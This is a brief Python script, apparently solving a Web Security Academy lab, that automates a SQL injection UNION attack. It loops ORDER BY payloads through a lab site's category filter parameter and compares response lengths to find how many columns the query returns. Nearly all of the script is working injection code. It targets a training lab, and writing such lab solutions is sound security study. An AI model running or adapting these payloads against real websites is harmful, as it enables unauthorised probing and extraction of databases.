import requests
import sys

#Lab: SQL injection UNION attack, determining the number of columns returned by the query

def sql_injection_union():
  headers={}
  i = 1
  base_url = "https://0a4b005a03cc991980b194a0000d00a0.web-security-academy.net/filter?category="
  url = f"{base_url}'+ORDER+BY+{i}--;"
  cookie = "session="
  headers["cookie"] = cookie
  res = requests.get(url,headers=headers)
  res_len = len(res.content)
  while True:
    i +=1
    url = f"https://0a4b005a03cc991980b194a0000d00a0.web-security-academy.net/filter?category='+ORDER+BY+{i}--;"
    res = requests.get(url,headers=headers)
    if res_len > len(res.content):
      i =  i-1
      return i
    
a = sql_injection_union()
print(f"answer:'+ORDER+BY+{a}")
